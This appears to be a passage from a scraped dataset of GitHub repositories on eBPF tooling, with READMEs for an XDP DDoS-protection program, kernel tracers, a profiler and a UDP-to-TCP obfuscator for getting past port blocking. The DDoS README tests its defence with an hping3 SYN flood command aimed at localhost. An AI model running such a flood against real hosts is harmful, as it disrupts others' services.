12. [Introduction to Cilium](https://training.linuxfoundation.org/training/introduction-to-cilium-lfs146/) - This prepares you for [Cilium Certified Associate (CCA)](https://tidd.ly/422X77M) certification. Click [here](https://medium.com/@nvsajeeva/how-to-pass-cca-cilium-certified-associate-exam-5a1b4f6ca63b) for the study guide.
13. [Introduction to Istio](https://training.linuxfoundation.org/training/introduction-to-istio-lfs144/) - This prepares you for [Istio Certified Associate (ICA)](https://tidd.ly/4isMzEG) certification. Click [here](https://medium.com/@nvsajeeva/how-to-pass-ica-istio-certified-associate-exam-355152566bc8) for the study guide.
14. [Introduction to Backstage: Developer Portals Made Easy](https://training.linuxfoundation.org/training/introduction-to-backstage-developer-portals-made-easy-lfs142/). This prepares you for [CBA](https://tidd.ly/4iu6NxX) certification. Click [here](https://medium.com/@nvsajeeva/how-to-pass-cba-certified-backstage-associate-exam-6f761c395313) for the study guide.
15. [Getting Started with OpenTelemetry](https://training.linuxfoundation.org/training/getting-started-with-opentelemetry-lfs148/). This prepares you for [OTCA](https://tidd.ly/4kRaAa8) certification. Click [here](https://medium.com/@nvsajeeva/how-to-pass-otca-opentelemetry-certified-associate-exam-e19d650cbe82) for the study guide.
16. [Inclusive Open Source Community Orientation](https://training.linuxfoundation.org/training/inclusive-open-source-community-orientation-lfc102/)

Note: If you wish to purchase advanced courses or certifications, you can find discounts in [this](https://github.com/CloudNativeStudyGroup/Linux-Foundation-Coupons) repository. 
## Cilium 
![Alt text](images/cilium-logo-920x460-sue-v1.png?raw=true ""Cilium Logo"")

Cilium is an open-source, cloud-native solution for providing, securing, and observing network connectivity between workloads. You can earn digital badges by completing labs posted by Isovalent. Once you learn Cilium, you may consider taking the [Cilium Certified Associate (CCA)](https://tidd.ly/422X77M) certification! Click [here](https://medium.com/@nvsajeeva/how-to-pass-cca-cilium-certified-associate-exam-5a1b4f6ca63b) for the CCA study gude. 

1. [Getting Started with Cilium](https://isovalent.com/labs/cilium-getting-started/)
2. [Discovery: Platform Engineer](https://isovalent.com/labs/discovery-platform-engineer/)
3. [Discovery: Cloud Network Engineer](https://isovalent.com/labs/discovery-cloud-network-engineer/)
4. [Discovery: SecOps Engineer](https://isovalent.com/labs/discovery-secops-engineer/)
5. [Getting Started with eBPF](https://isovalent.com/labs/ebpf-getting-started/)
6. [BGP on Cilium](https://isovalent.com/labs/cilium-bgp/)
7. [Cilium Egress Gateway](https://isovalent.com/labs/cilium-egress-gateway/)
8. [Cilium Gateway API](https://isovalent.com/labs/cilium-gateway-api/)
9. [Cilium Cluster Mesh](https://isovalent.com/labs/cilium-cluster-mesh/)
10. [Mutual Authentication with Cilium](https://isovalent.com/labs/cilium-mutual-authentication/)
11. [Cilium Ingress Controller](https://isovalent.com/labs/cilium-ingress-controller/)

## Calico
![Alt text](images/calico.png?raw=true ""Calico Logo"")

Calico is a networking and security solution for containers, virtual machines, and native host-based workloads. Tigera offers four [free courses](https://www.tigera.io/lp/calico-certification/), but it appears that only one course provides a free Credly badge.

1. [Certified Calico Operator - eBPF](https://academy.tigera.io/course/certified-calico-operator-ebpf/)

## AWS
![Alt text](images/aws.png?raw=true ""AWS"")

Amazon Web Services has been providing world-leading cloud technologies that help any organization and any individual build solutions to transform industries.


1. [AWS Cloud Essentials](https://explore.skillbuilder.aws/learn/public/learning_plan/view/82/cloud-essentials-learning-plan)
2. [AWS Knowledge: Serverless](https://explore.skillbuilder.aws/learn/public/learning_plan/view/92/serverless-learning-plan)
3. [AWS Knowledge: Amazon EKS](https://explore.skillbuilder.aws/learn/public/learning_plan/view/1931/amazon-eks-knowledge-badge-readiness-path)
4. [AWS Knowledge: Networking Core](https://explore.skillbuilder.aws/learn/public/learning_plan/view/1944/networking-core-knowledge-badge-readiness-path)
5. [AWS Knowledge: Architecting](https://explore.skillbuilder.aws/learn/public/learning_plan/view/1044/solutions-architect-knowledge-badge-readiness-path)
6. [AWS Knowledge: Compute](https://explore.skillbuilder.aws/learn/public/learning_plan/view/1985/compute-knowledge-badge-readiness-path)
7. [AWS Knowledge: Events and Workflows](https://explore.skillbuilder.aws/learn/public/learning_plan/view/1927/events-and-workflows-knowledge-badge-readiness-path)
8. [AWS Knowledge: File Storage](https://explore.skillbuilder.aws/learn/public/learning_plan/view/95/file-storage-knowledge-badge-readiness-path)
9. [AWS Knowledge: Data Migration](https://explore.skillbuilder.aws/learn/public/learning_plan/view/94/storage-data-migration-knowledge-badge-readiness-path)
10. [AWS Knowledge: Cloud Essentials](https://explore.skillbuilder.aws/learn/public/learning_plan/view/82/cloud-essentials-knowledge-badge-readiness-path)
11. [AWS Knowledge: Media & Entertainment: Direct-to-Consumer and Broadcast Foundations](https://explore.skillbuilder.aws/learn/public/learning_plan/view/1722/media-entertainment-direct-to-consumer-and-broadcast-foundations-knowledge-badge-readiness-path)
12. [AWS Knowledge: Data Protection & Disaster Recovery](https://explore.skillbuilder.aws/learn/public/learning_plan/view/54/storage-learning-plan-data-protection-and-disaster-recovery)
13. [AWS Knowledge: Migration Foundations](https://explore.skillbuilder.aws/learn/public/learning_plan/view/1991/migration-foundations-knowledge-badge-readiness-path)
14. [AWS Cloud Quest: Cloud Practitioner](https://explore.skillbuilder.aws/learn/course/external/view/elearning/11458/aws-cloud-quest-cloud-practitioner)

[AWSeducate](https://www.awseducate.com/signin/SiteLogin?language=de) is another free learning platform from AWS where you can earn badges with lab based courses on various topics while gaining hands-on experience.
1. [Introduction to Cloud 101](https://awseducate.instructure.com/courses/891)
2. [Getting Started with Storage](https://awseducate.instructure.com/courses/908)
3. [Getting Started with Compute](https://awseducate.instructure.com/courses/907)
4. [Getting Started with Networking](https://awseducate.instructure.com/courses/911)
5. [Getting Started with Databases](https://awseducate.instructure.com/courses/912)
6. [Getting Started with Cloud Operations](https://awseducate.instructure.com/courses/889)
7. [Getting Started with Security](https://awseducate.instructure.com/courses/890)
8. [Getting Started with Serverless](https://awseducate.instructure.com/courses/905)
9. [Machine Learning Foundations](https://awseducate.instructure.com/courses/910)
10. [AWS DeepRacer Primer](https://awseducate.instructure.com/courses/906)
11. [Introduction to Generative Artificial Intelligence](https://awseducate.instructure.com/courses/1108)
12. [Builder Labs](https://awseducate.instructure.com/courses/904)


## Broadcom
![Alt text](images/broadcom.png?raw=true ""Broadcom"")

Broadcom is a global technology leader specializing in the design, development, and supply of a broad range of semiconductor and infrastructure software solutions. These courses will be completely removed from NDG services on August 15, 2025. Click [here](https://support.netdevgroup.com/hc/en-us/articles/25519276731543-Termination-of-VMware-IT-Academy-by-Broadcom) to learn more.

1. [IT Academy: Cloud and Virtualization Concepts](https://www.netdevgroup.com/online/courses/virtualization/cloud-and-virtualization-concepts)
2. [IT Academy: Network Virtualization Concepts](https://www.netdevgroup.com/online/courses/virtualization/network-virtualization-concepts)

---
### Other Useful Repositories

1. [Linux Foundation coupons](https://github.com/CloudNativeStudyGroup/Linux-Foundation-Coupons)
2. Join [certdirectory.io](https://certdirectory.io) to showcase your achievements! 


## Join our community

Join our [community](https://www.linkedin.com/groups/13092099/) to learn together!
"
bihari123/naarad,21,3,21,1,C,"Naarad is a system monitoring software based on eBPF .Currently supports linux (compile once, run everywhere)",2024-09-27T17:03:26Z,2025-07-12T08:07:12Z,6,"# naarad

Naarad is a system monitoring software based on eBPF .Currently supports linux (compile once, run everywhere). To get the extended source code: contact at thakur.cs.tarun@gmail.com
## Demo

https://github.com/user-attachments/assets/e888895c-2141-4cc3-8eb4-c772358c1088

## Project Naarad
A system monitoring and security tool powered by eBPF, inspired by Naarad Muni - the divine messenger in Hindu mythology.
### Overview
Project Naarad is a sophisticated system monitoring and security enforcement tool that leverages eBPF (Extended Berkeley Packet Filter) technology to trace system calls and implement security policies through Linux Security Modules (LSM). Just as Naarad Muni served as a messenger between gods and demons, this tool acts as a bridge between system events and security enforcement.
Features

### eBPF-based System Call Tracing

Real-time monitoring of system calls
Detailed tracking of process behaviors
Low-overhead implementation


### Linux Security Module Integration

Custom security policy enforcement
Access control management
Granular permission settings


### Terminal User Interface

Interactive ncurses-based interface
Real-time system monitoring display
User-friendly navigation


### Internal Communication

Linux message queue implementation
Efficient data passing between eBPF components
Reliable inter-process communication
"
SRodi/xdp-ddos-protect,32,7,32,1,C,This project provides a BPF XDP program to detect and mitigate DDoS attacks targeting a specific endpoint by monitoring unusually high traffic,2024-11-28T10:15:31Z,2025-09-16T01:43:15Z,4,"[![Test XDP program compile/load/attach on Ubuntu](https://github.com/SRodi/xdp-ddos-protect/actions/workflows/test.yml/badge.svg)](https://github.com/SRodi/xdp-ddos-protect/actions/workflows/test.yml)

# Protect from DDoS attacks with XDP 

The [xdp_ddos_protection.c](./xdp_ddos_protection.c) file contains an eBPF program designed for DDoS protection using XDP (eXpress Data Path).

This README.md also contains simple instructions to simulate a `SYN flood attack` on the lo interface by running a local server used as a target, which listens on a given TCP port, and a client which sends many SYN packets to the target.

![Demo](./static/demo.gif)

## Program logic

The `eBPF XDP program` includes the necessary Linux kernel headers and defines constants for rate limiting, such as the maximum packets per second (`THRESHOLD`) and the time window in nanoseconds (`TIME_WINDOW_NS`).The program maintains a hash map (`rate_limit_map`) to track the rate limit for each source IP address, storing the last update timestamp and packet count within the time window.

The ddos_protection function, marked with the `SEC(""xdp"")` section, processes incoming packets, starting by parsing the `Ethernet header`. It checks if the packet is an `IP packet` and ensures that the packet data is within bounds before proceeding with further processing. If the packet is not an IP packet or the data is out of bounds, it passes the packet without any action.

If none of the above conditions are met, the function then extracts the source IP address from the IP header of the incoming packet. It then looks up a rate limit entry for this IP address in the `rate_limit_map` BPF map.

The current time is fetched in nanoseconds using `bpf_ktime_get_ns()`. If an entry for the source IP exists, the code checks if the current time is within the same time window defined by `TIME_WINDOW_NS`. If it is, the packet count for this IP is incremented. If the packet count exceeds a predefined `THRESHOLD`, the packet is dropped by returning `XDP_DROP`. If the time window has elapsed, the packet count is reset, and the time of the last update is set to the current time.

If no entry exists for the source IP, a new rate limit entry is initialized with the current time and a packet count of one. This new entry is then added to the rate_limit_map. If the packet count is within the threshold, the packet is allowed to pass by returning `XDP_PASS`. This mechanism helps in mitigating DDoS attacks by limiting the rate of packets from any single IP address.

## Compatibility

This program is compatible for both `amd64` and `arm64` architectures. The program was tested on Ubuntu/Debian Linux distributions with `kernel version >= 5.15`.

![arm64](./static/arm64.png)

## Repository files

* [Makefile](./Makefile): help to compile, attach, and detach the BPF program
* [README.md](./README.md): provides instructions and documentation
* [xdp_ddos_protection.c](./xdp_ddos_protection.c): eBPF program for DDoS protection using XDP

## Installation

1. . **Install clang, llvm, libbpf and make**:
    ```sh
    sudo apt-get install clang llvm libbpf-dev make -y
    ```
2. **Clone the repository**:
    ```sh
    git clone https://github.com/srodi/xdp-ddos-protect.git
    cd xdp-ddos-protect
    ```

## Compile BPF code
To compile BPF XDP program, run:
```sh
make compile
```

## Attach the BPF program
To attach the program to `lo` interface, use:
```sh
make attach
```

To attach to another interface:
```sh
make attach IFACE=eth0
```

## Detach program
To detach the BPF program
```sh
make detach
```

## Test

To test a DDoS attack, you can use `hping3` tool, here is a script
```sh
sudo apt install hping3
```

Run an `nginx` server locally using `docker`:
```sh
docker run -p 1234:80 nginx
```
Then run the test:
```sh
sudo hping3 -i u1000 -S -p 1234 127.0.0.1
```

The `-i u1000` option in the `hping3` command specifies the interval between packets. Here, `u1000` means 1000 microseconds (1 millisecond) between each packet. This option is used to control the rate of packet sending, which is useful for simulating high traffic or DDoS attacks.

The `-S` option in the `hping3` command specifies that the SYN flag should be set in the TCP packets. This is used to simulate a SYN flood attack, which is a type of DDoS attack where many SYN packets are sent to a target to overwhelm it.

## Troubleshooting

**Add the correct include path**
If the header files `types.h` are located in a different directory than `/usr/include/asm`, you can add the include path manually via environment variable `C_INCLUDE_PATH`:

```sh
# ensure asm/types.h exists in the expected directory
find /usr/include -name 'types.h'

# example for Ubuntu 24.04 x86_64 
export C_INCLUDE_PATH=/usr/include/x86_64-linux-gnu
```

**Disable LRO**
If you're encountering an issue with attaching an XDP program to the eth0 interface with a similar error to the following, this is due to Large Receive Offload (LRO) being enabled.

```sh
$ sudo ip link set dev eth0 xdp obj xdp_ddos_protection.o sec xdp
Error: hv_netvsc: XDP: not support LRO.
```
The error message indicates that the hv_netvsc driver does not support XDP when LRO is enabled. To resolve this issue, you need to disable LRO on the eth0 interface before attaching the XDP program. You can do this using the ethtool command:

```sh
sudo ethtool -K eth0 lro off
```

## Considerations

The test presented above uses `lo` which is a virtual network interface - by default, XDP is designed to work on physical and virtual interfaces that send and receive packets from the network. The loopback interface behaves differently because it is a purely software interface used for local traffic within the system.

Traffic on the loopback interface is not ""real"" network traffic, it is handled entirely within the kernel. As a result, certain packet processing steps (like those involving hardware offload) are bypassed, and this can affect how XDP interacts with the loopback interface.

The performance benefits of XDP may be less pronounced for loopback traffic compared to physical interfaces. This means the performance is greater on regular network interfaces like `eth0`, which represent a physical hardware device. 

## License
This project is licensed under the MIT License. See the LICENSE file for details."
Utkar5hM/mariadb-ebpf-exporter,14,1,14,0,C,eBPF based  prometheus Exporter for mysql/mariadb query latencies.,2023-08-21T13:53:37Z,2025-10-12T14:26:36Z,30,"# mariadb-ebpf-exporter

This project aims to utilize eBPF technology to measure query execution latency in MariaDB and MySQL databases. Focusing on grouping similar queries by fingerprinting(kind of normalizing them) and to export the data as Prometheus metrics for efficient performance analysis.

# Usage Instruction:

Build the project using the provided build instructions. This will create a completely static binary, eliminating the need for installing any dependencies once built. Ensure that the kernel supports the eBPF features used. I do not have a list of kernel versions that support the features used, but I have tested it on Arch Linux with kernel version `6.5.3-arch1-1`.

To simplify the building process, you can use the `build.sh` script.

## build script guide 

#### The first argument is the build type. The following build types are supported:

- `docker-run`: will build the project using docker and start a container which runs the exporter.

- `docker-attach-run` will build the project using docker for a currently running mariadb docker container by default with name `some-mariadb` and starts the exporter container that attaches to the process namespace of the database container, collecting and exporting query latency statistics.

- `local-build`: will build the project locally and generate the binary.

- `docker-build` will build the project using docker and copy the generated binary to the ./output directory.

- `docker-attach-build` will build a docker image by default for the latest mariadb docker image and copy the generated binary to the ./output directory. db image can be specified using the `-di` flag. The docker run command specified for docker-attach-run in `build.sh` can be used to start a container according to your needs.


#### Additional optional arguments can be passed to the build script. The following arguments are supported:

- The `-d` flag specifies the database server mariadb or mysql. Use it if you want to build for a different version of mysql. By default, it is set to mariadb. Make sure It is specified if you're using `mysql` as both of them have a different function for executing queries leading to different ebpf kernel space programs. 

- The `-f` flag is an optional argument. Use it if your mysqld is located in a different path and not symlinked. By default, mariadbd is usually symlinked to /usr/bin/mysqld, so the argument is not required in that case better to have a check. This also makes sure that the correct symbol name is found and used while building for your version of mariadb/mysql.

- The `-a` flag is an optional argument. It is for specifying mysqld/mariadbd path where the ebpf probes will be attached. By default, it is set to /usr/bin/mysqld. It is not required to be set for docker-attach-run and docker-attach-build as it will be automatically set to the running container's process pid exe path `/proc/1/exe`. ( Note: This docker-attach-run will start a container by having pid namespace of the the db container and will attach the probes to the process with pid 1 in that namespace. So, make sure that the db container is running before running this command. )

- The `-i` flag is an optional argument. It is for specifying the docker image name to be used for all the docker-* commands. By default, it is set to mariadb-ebpf-exporter.

- The `-di` flag is an optional argument. It is for specifying the docker image of database to be used to build ebpf exporter for. By default, it is set to `mariadb:latest`.

- The `-c` flag is for specifying the name of the container to be used by docker-run and docker-attach-run. By default, it is set to `mariadb-ebpf-exporter`. 

- The `-dc` flag is for specifying the name of the database container to be used by docker-attach-run. By default, it is set to `some-mariadb`.

- The `-p` flag is for specifying the port to be used by docker-run and docker-attach-run. By default, it is set to `2112`.

- The `-t` flag is for specifying the minimum latency in milliseconds for a query to be considered slow to be captured by the exporter. By default, it is set to 0 capturing all queries.


-------------------

## Docker:

Build the static binary and start the container by running the following command.

```sh
./build.sh docker-start
```

To only build the static binary with Docker and copy it to the ./output directory, run the following command, lets also specify the mariadbd path to be used for finding the symbols as an example.

```sh
./build.sh docker-build -f  /pathto/mysqld/or/mariadbd/
```

## Docker-attach:
An example to Build the static binary and attach the probes to the running db container by running the following command. This will attach to a db container with name MY_PROD_DB and will start a container with name db_query_monitor. 

```sh
./build.sh docker-attach-run -c db_query_monitor -dc MY_PROD_DB
```

To only build the docker Image to later start the container for a specific db docker image, run the following command. This will build the docker image for the latest mariadb docker image.

```sh
./build.sh docker-attach-build -di mariadb:latest
```

## Locally:

Run the build.sh script with the local-build argument. Make sure you have all the prerequisites installed. You can refer to builder/prepare-ubuntu.sh for more information or simply use the Docker version. Let us specify a process path to be used for attaching the probes as an example.

```sh
./build.sh local-build -f /pathto/mysqld/or/mariadbd/ -a /proc/2020/exe
```

-----------------

### Once the project is built (by docker or locally), you can execute the generated binary by running:

```sh
./output/main-static
```"
amiremohamadi/aoc,1,0,1,0,Shell,my advent of code solutions,2024-12-01T13:52:15Z,2024-12-02T14:38:17Z,5,
RinHizakura/kmemsnoop,24,0,24,0,Rust,Install a hardware breakpoint in Linux kernel for tracing/debugging,2024-05-03T17:52:37Z,2025-07-31T13:21:38Z,109,"# kmemsnoop

## Introduction

On specific processors, hardware breakpoint registers are supported to monitor
memory access or instruction execution in hardware manner. The great advantage
of using these is that it causes little overhead on trace.

With the `kmemsnoop`, you can easily install a hardware
breakpoint/watchpoint in Linux kernel, as long as it is supported for your
platform. This enables us to trace/debug the running Linux kernel without KGDB
or hardware debugger.

## Usage

### Prerequisite

`kmemsnoop` relies on
[eBPF CO-RE(Compile Once â€“ Run Everywhere)](https://docs.kernel.org/bpf/libbpf/libbpf_overview.html#bpf-co-re-compile-once-run-everywhere)
to enable complete kernel tracing, so the following kernel config **must**
be required.

```
CONFIG_DEBUG_INFO_BTF=y
CONFIG_PAHOLE_HAS_SPLIT_BTF=y
CONFIG_DEBUG_INFO_BTF_MODULES=y
```

Besides, you may want to expose more kernel symbols to userspace with the
following settings. These are convenient for you to find the address of
kernel symbols from `/proc/kallsyms` instead of inspecting the vmlinux source.
On top of that, `/proc/kallsyms` makes kernel tracing with
[KASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization)
enabled possible.

```
CONFIG_KALLSYMS=y
CONFIG_KALLSYMS_ALL=y
```

(Optional) `kmemsnoop` tool support a special type of expression called
**kexpr**. It allows you to access specific kind of object in the kernel(e.g.
a `struct task_struct` from task pid), and set watchpoint on the object member
with the given expression. In order to use this feature, you need to enable
`/proc/kcore` to make access the kernel objects possible.

```
CONFIG_PROC_KCORE=y
```

### Build

These dependencies are required to build kmemsnoop.

```
$ sudo apt install automake clang llvm libelf1 libelf-dev zlib1g-dev
```

You will also need bpftool for the generating of vmlinux.h.

```
$ git clone https://github.com/libbpf/bpftool.git
$ cd bpftool
$ git submodule update --init
$ cd src
$ make
$ sudo make install
```

After the installation of these dependencies, you should be able to build
`kmemsnoop` now.

```
$ make
```

### Execute

```
$ kmemsnoop --help

Usage: kmemsnoop [OPTIONS] <BP> <EXPR>

Arguments:
  <BP>    type of the watchpoint [possible values: r1, w1, rw1, x1, r2, w2, rw2, x2, r4, w4, rw4, x4, r8, w8, rw8, x8]
  <EXPR>  expression of watchpoint(kernel symbol or addess by default)

Options:
  -v, --vmlinux <VMLINUX>    vmlinux path of running kernel(need nokaslr)
      --pid-task <PID_TASK>  kexpr: use 'struct task_struct' from pid
      --pci-dev <PCI_DEV>    kexpr: 'struct pci_dev' from the device name
      --usb-dev <USB_DEV>    kexpr: 'struct usb_device' from the device name
      --plat-dev <PLAT_DEV>  kexpr: 'struct platform_device' from the device name
  -h, --help                 Print help
```

* `EXPR` is the expression to describe the watchpoint. If not using the ""kexpr""
options(e.g. `--pid-task`), it can be the name of kernel symbol or addess value
in hex. If using the ""kexpr"", it is the expression dereferenced from the
given structure according the option.
* `BP` is the type of watchpoint. For example, r8 means to watch a read
operation from the base of `EXPR` with 8 bytes length.

Options:
* `VMLINUX` is the path of `vmlinux` file for getting the address of kernel
symbol instead of using `/proc/kallsyms`. To use this option, you need to
add `nokaslr` to kernel bootargs because the address on kernel symbol will be
random without it.
* `PID_TASK` allows you to watch the field which is dereferenced from a
`struct task_struct` by `EXPR`. The `struct task_struct` comes from the task
whose pid is `PID_TASK`.
* `PCI_DEV` allows you to watch the field which is dereferenced from a
`struct pci_dev` by `EXPR`. The `struct pci_dev` comes from the device with
name `PCI_DEV`. Check `/sys/bus/pci/devices/` for the valid name.
* `USB_DEV` allows you to watch the field which is dereferenced from a
`struct usb_device` by `EXPR`. The `struct usb_device` comes from the device with
name `USB_DEV`. Check `/sys/bus/usb/devices/` for the valid name.
* `PLAT_DEV` allows you to watch the field which is dereferenced from a
`struct platform_device` by `EXPR`. The `struct platform_device` comes from the
device with name `PLAT_DEV`. Check `/sys/bus/platform/devices/` for the valid name.

### Examples

If you want to trace the execution of kernel function `schduler_tick()`.

```
$ sudo kmemsnoop x8 scheduler_tick
```

If you want to trace the read and write access for kernel variable
`sysctl_sched_cfs_bandwidth_slice`.

```
$ sudo kmemsnoop rw4 sysctl_sched_cfs_bandwidth_slice -v vmlinux

# You can run the following command to trigger the watchpoint!
$ cat /proc/sys/kernel/sched_cfs_bandwidth_slice_us
```

If you want to watch the object under `struct task_struct`, for example, the
`&task->on_rq` of task pid 1.

```
$ sudo kmemsnoop --pid-task 1 rw4 \&on_rq
```


If you want to watch the object point by a pointer under `task_struct`(not the
pointer itself), for example, the `task->parent` of task pid 1.

```
$ sudo kmemsnoop --pid-task 1 rw8 parent
```

If you want to watch the field inside the struct in `task_struct`, for example,
`&task->se.nr_migrations`.

```
$ sudo kmemsnoop --pid-task 1 rw8 \&se.nr_migrations
```

If you want to watch the field inside the struct which can be referenced from
the `task_struct`, for example, `&task->mm->task_size`.

```
$ sudo kmemsnoop --pid-task 1 rw8 ""\&mm->task_size""
```

If you want to trace the field `vendor` under `struct pci_dev` for PCI device
`0001:00:00.0`.

```
$ sudo kmemsnoop --pci-dev 0000:00:00.0 rw2 \&vendor

# You can run the following command to trigger the watchpoint!
$ cat /sys/bus/pci/devices/0000:00:00.0/vendor
```
"
hack3ric/mimic,228,16,228,2,C,eBPF UDP -> TCP obfuscator,2023-10-23T14:02:38Z,2025-10-03T19:04:43Z,765,"# Mimic

[Getting Started](docs/getting-started.md) | [mimic(1)](docs/mimic.1.md)

Mimic is a UDP to TCP obfuscator designed to bypass UDP QoS and port blocking. Based on eBPF, it directly mangles data inside Traffic Control (TC) subsystem in the kernel space and restores data using XDP, achieving remarkably high performance compared to other projects, such as [udp2raw](https://github.com/wangyu-/udp2raw) or [Phantun](https://github.com/dndx/phantun).

## Installation

Mimic currently ships prebuilt packages for Debian 12 (bookworm), 13 (trixie) and Ubuntu 24.04 (noble) for x86_64 in [GitHub releases](https://github.com/hack3ric/mimic/releases). Release artifacts contains:

- **`<codename>_mimic_<ver>_<arch>.deb`: Mimic CLI**
- **`<codename>_mimic-dkms_<ver>_<arch>.deb`: Mimic kernel module for DKMS**
- `<codename>_mimic{,-dkms}_dbgsym_<ver>_<arch>.{,d}deb`: Debug symbols
- `*.sha256`: SHA256 checksum of the corresponding file

To install, download both `mimic` and `mimic-dkms` packages (the first two of the above) *prefixed with the correct distribution codename* and install with:

```console
# apt install ./*_mimic_*.deb ./*_mimic-dkms_*.deb
```

OpenWrt support is currently experimental, see [`openwrt` branch](https://github.com/hack3ric/mimic/tree/openwrt) and [OpenWrt Support](docs/openwrt.md) documentation.

For building from source (including AUR and other Debian and Ubuntu versions), see [Building from Source](docs/building.md) for more information.

## Details

Mimic extends every UDP packet with 12 bytes. First 12 bytes of the data is moved to the back, and the UDP header is transformed into TCP header in place.

When used with a tunnel protocol, make sure to lower the MTU bytes by 12. For example, a WireGuard tunnel over IPv6 and Ethernet would need to change its MTU from 1420 to 1408. For IPv4, the default value of 1420 will work, with the maximum MTU being 1428.

The following shows how Mimic works visually:

```
+---------------+-------------------------+---------+----------------------------------------+
| Ethernet (14) |    IPv4 Header (20)     | UDP (8) |               Data  ...                |
+---------------+-------------------------+---------+----------------------------------------+
                                                    |<------------->|
                                                     Part to be moved                             ...here
                                                                                             |<-------------->|
+---------------+-------------------------+-------------------------+------------------------+----------------+
| Ethernet (14) |    IPv4 Header (20)     |     TCP Header (20)     |   Remaining Data  ...  |  Fragment (12) |
+---------------+-------------------------+-------------------------+------------------------+----------------+
```

## Benchmark

*TODO: to be re-tested*

### Environment

- Host CPU Core i9-13900F, running Arch Linux (2023-11-13)
- Two VMs running Debian 12 on libvirt QEMU/KVM, with 4 vcores each, using emulated e1000e NIC
- Test commands: `iperf3 -s` and `iperf3 -c <server IPv4> -t 20`
- WireGuard tunnels run over IPv4

### Speed

| Connection                                           | MTU  | Recv Speed | Send CPU Usage | Recv CPU Usage |
| ---------------------------------------------------- | ---- | ---------- | -------------- | -------------- |
| **Direct**                                           | 1500 | 5.28 Gbps  | 4x10%          | 2x100%, 2x1%   |
| **WireGuard**                                        | 1440 | 2.38 Gbps  | 1x100%, 3x10%  | 1x40%, 3x35%   |
| **WireGuard + udp2raw**<br>w/ fake TCP + `--fix-gro` | 1342 | 788 Mbps   | 1x100%, 3x10%  | 1x100%, 3x20%  |
| **WireGuard + Phantun**                              | 1428 | 980 Mbps   | 4x30%          | 4x35%          |
| **WireGuard + Mimic**                                | 1428 | 2.23 Gbps  | 1x100%, 3x10%  | 1x40%, 3x35%   |

### CPU usage

`iperf3 -c <server IPv4> -t 20 -b 500M`

| Connection                                           | MTU  | Recv Speed | Send CPU Usage | Recv CPU Usage |
| ---------------------------------------------------- | ---- | ---------- | -------------- | -------------- |
| **Direct**                                           | 1500 | 500 Mbps   | 4x<5%          | 4x<5%          |
| **WireGuard**                                        | 1440 | 500 Mbps   | 1x35%, 4x<5%   | 4x<5%          |
| **WireGuard + udp2raw**<br>w/ fake TCP + `--fix-gro` | 1342 | 500 Mbps   | 1x50%, 3x25%   | 1x55%, 3x10%   |
| **WireGuard + Phantun**                              | 1428 | 500 Mbps   | 4x15%          | 4x20%          |
| **WireGuard + Mimic**                                | 1428 | 500 Mbps   | 1x38%, 4x<5%   | 4x<5%          |

## License

The project is licensed under GNU General Public License version 2 only (GPL-2.0-only). See LICENSE for more details.
"
javierhonduco/lightswitch,18,4,18,14,Rust,CPU profiler as a library for Linux suitable for on-demand and continuous profiling running on BPF,2024-01-24T10:32:37Z,2025-10-06T09:23:51Z,335,"[![ci](https://github.com/javierhonduco/lightswitch/actions/workflows/build.yml/badge.svg?branch=main)](https://github.com/javierhonduco/lightswitch/actions/workflows/build.yml)

lightswitch
===========
**lightswitch** is a profiler as a library for Linux suitable for on-demand and continuous on-CPU profiling. It's mostly written in Rust but the unwinders are written in C and run in BPF. Currently C, C++, Rust, Zig, and Go are fully supported on x86_64 (arm64 support is experimental).

The main features / design goals are:

* Low overhead: currently targeting 3% CPU utilization and 500MB of memory.
* No requirement for applications to be compiled with frame pointers.
* Detailed metrics to understand profiling effectiveness and troubleshoot issues.
* Enhanced unwinding capability for larger process stacks by not relying on [`PERF_SAMPLE_STACK_USER`](https://man7.org/linux/man-pages/man2/perf_event_open.2.html).
* Support for modern kernels, released approximately 4y ago.

Installation
------------
The [latest release](https://github.com/javierhonduco/lightswitch/releases/latest) contains pre-built binaries and container images in the OCI format (Docker compatible). Alternatively, for every commit merged to the `main` branch, an OCI container tagged with the full Git sha1 is published to [the GitHub registry](https://github.com/javierhonduco/lightswitch/pkgs/container/lightswitch).

Usage
-----
As a CLI, **lightswitch** can be run with:

```shell
$ sudo lightswitch
```

It can be stopped with <kbd>Ctrl</kbd>+<kbd>C</kbd>, or alternatively, by passing a `--duration` in seconds. A flamegraph in SVG will be written to disk. Pprof is also supported with `--profile-format=pprof`. By default the whole machine will be profiled, to profile invidual processes you can use `--pids`.

Using Docker:

```shell
$ docker run -it --privileged --pid=host -v /sys:/sys -v $PWD:/profiles -v /tmp/lightswitch ghcr.io/javierhonduco/lightswitch:main-$LIGHTSWITCH_SHA1 --profile-path=/profiles
```

Development
-----------
We use `nix` for the development environment and the building system. It can be installed with [the official installer](https://nixos.org/download/#nix-install-linux) (make sure to enable support for flakes) or with the [Determinate Systems installer](https://github.com/DeterminateSystems/nix-installer?tab=readme-ov-file#usage). Once `nix` is installed, you can

* start a developer environment with `nix develop` and then you'll be able to build the project with cargo with `cargo build`. This might take a little while the first time.
* generate a container image `nix build .#container` will write a symlink to the container image under `./result`.

### Building
```shell
# after running `nix develop`
$ cargo build # use `--release` to get an optimized build
$ sudo ./target/debug/lightswitch # or ./target/release for optimized builds
```

### Running tests
```shell
# after running `nix develop`
$ cargo test
```

### Running kernel tests
```shell
$ nix run .#vmtest
```

Reporting bugs
--------------
When reporting any bugs, please share which version / revision you are running, the arguments, the output of `lightswitch system-info` and if relevant, the logs with `--logging=debug`. If you suspect there is a bug in the unwinders, adding `--bpf-logging` and sharing the output from `bpftool prog tracelog` or `/sys/kernel/debug/tracing/trace_pipe` will be very helpful.

Project status
---------------
**lightswitch** is in active development and the main focus is to provide a low-overhead profiler with excellent UX. A more comprehensive roadmap will be published. Feedback is greatly appreciated.
"
angeloxx/cilium-haegress-operator,28,4,28,7,Go,"Watch Cilium services placement and use for Cilium Egress Gateway, see https://github.com/cilium/cilium/issues/18230",2024-03-02T22:41:17Z,2025-10-11T05:54:23Z,134,"![Logo](https://github.com/angeloxx/cilium-haegress-operator/raw/main/docs/img/cilium-haegress-operator_mini.png)

# cilium-haegress-operator
[![License: AGPL v3](https://img.shields.io/badge/License-AGPL_v3-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)

This operator is used in an environment where you want to use Cilium as Ingress and Egress traffic manager. 

## Description
Due the limitation of CiliumEgressGatewayPolicy, it is not possible to implement freely an HA solution where the policy 
defines two egress IP or the IP is moved automatically from a node to another.
